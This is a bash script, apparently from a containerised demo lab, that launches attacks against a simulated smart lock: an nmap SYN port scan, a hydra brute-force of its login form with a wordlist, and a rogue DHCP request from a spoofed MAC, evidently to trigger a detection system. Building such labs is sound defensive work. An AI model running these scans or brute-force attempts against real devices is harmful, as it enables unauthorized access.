#!/usr/bin/env bash
# Demo attack runner:  attack scan | brute | rogue | all
#   docker compose --profile demo exec attacker attack scan
set -uo pipefail
TARGET="${TARGET:-smartlock}"
LOCK_PORT="${LOCK_PORT:-8080}"
ROGUE_MAC="${ROGUE_MAC:-de:ad:be:ef:00:01}"

scan() {
  echo ">> port scan: nmap -sS -p 1-200 $TARGET"
  nmap -sS -T4 -Pn -n -p 1-200 "$TARGET"
}

brute() {
  echo ">> brute force: hydra against http://$TARGET:$LOCK_PORT/login"
  hydra -l admin -P /opt/wordlist.txt -s "$LOCK_PORT" -t 4 -f "$TARGET" \
    http-post-form "/login:user=^USER^&pass=^PASS^:F=denied"
}

rogue() {
  echo ">> rogue device: DHCP lease requested by unknown MAC $ROGUE_MAC"
  python3 /opt/dhcp_discover.py "$ROGUE_MAC" rogue-demo
}

case "${1:-}" in
  scan) scan ;;
  brute) brute ;;
  rogue) rogue ;;
  all) rogue; sleep 3; brute; sleep 3; scan ;;     # the scan is last: it gets the attacker blocked
  *) echo "usage: attack scan|brute|rogue|all"; exit 1 ;;
esac
